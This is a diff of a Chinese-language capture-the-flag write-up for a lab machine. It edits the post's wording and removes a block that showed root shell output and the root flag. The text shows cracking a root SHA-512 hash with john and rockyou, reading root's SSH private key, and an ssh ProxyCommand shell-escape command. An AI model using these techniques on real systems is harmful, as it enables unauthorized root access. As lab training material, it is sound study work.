@@ -506,15 +506,11 @@ welcome:<span class="pl-smi">$6</span><span class="pl-smi">$dhmqudmnaomw</span>.
 <div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> echo 'root:$6$qgppm7vz3uxoh2kt$vkj8.on1has6b9.tm8ms5fwhmvmxrvz29bcznqmjfqojkphvaznoozhyt0.o2x3s3nbqrswpci.lhvk94armu.:20263:0:99999:7:::'&gt;hash                                        </span>
 └─<span class="pl-c"><span class="pl-c">#</span> john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt hash </span></pre></div>
 <p>直接爆破不行，因为<code class="notranslate">ssh -F读文件会自动转为小写</code></p>
-<p>本靶机虽然有私钥但漏配置了<code class="notranslate">authorized_keys</code>所以读<code class="notranslate">root</code>的私钥登录这条路也不行，如果靶机赔了<code class="notranslate">authorized_keys</code>就可以使用<code class="notranslate">ssh -i /root/.ssh/id_rsa root@localhost </code> 方式登陆不了</p>
+<p>本靶机虽然有私钥但漏配置了<code class="notranslate">authorized_keys</code>所以读<code class="notranslate">root</code>的私钥登录这条路也不行，如果靶机配置了<code class="notranslate">authorized_keys</code>就可以使用<code class="notranslate">ssh -i /root/.ssh/id_rsa root@localhost </code> 方式登陆了</p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/690fb61c67c4089531280ed5fa89c276a183f2ea0f540a959f272e613e4587e9/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303632393037303235393231372e706e67"><img src="https://camo.githubusercontent.com/690fb61c67c4089531280ed5fa89c276a183f2ea0f540a959f272e613e4587e9/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303632393037303235393231372e706e67" alt="image-20250629070259217" data-canonical-src="https://gitee.com/shui666/images/raw/master/images/image-20250629070259217.png" style="max-width: 100%;"></a></p>
 <p>如果像HYH一样欧皇运气爆棚，直接猜到<code class="notranslate">root</code>密码是<code class="notranslate">57</code>（数字是不是很熟悉，前面隐藏信息的就是第57个pdf），或许就成功和作者对上脑电波了</p>
 <h5>拿到<code class="notranslate">root.txt</code></h5>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">~</span> <span class="pl-c"><span class="pl-c">#</span> id</span>
-uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
-<span class="pl-k">~</span> <span class="pl-c"><span class="pl-c">#</span> cd</span>
-<span class="pl-k">~</span> <span class="pl-c"><span class="pl-c">#</span> cat root.txt</span>
-flag{root-b89ed76b27e91ad5d773ddadae256072}</pre></div>
+<div class="highlight highlight-source-shell"><pre class="notranslate"></pre></div>
 <p>测试<code class="notranslate">ProxyCommand </code>参数执行命令失败</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>ProxyCommand参数执行命令</span>
 /usr/bin/ssh -o ProxyCommand=<span class="pl-s"><span class="pl-pds">'</span>;sh 0&lt;&amp;2 1&gt;&amp;2<span class="pl-pds">'</span></span> x</pre></div></div>
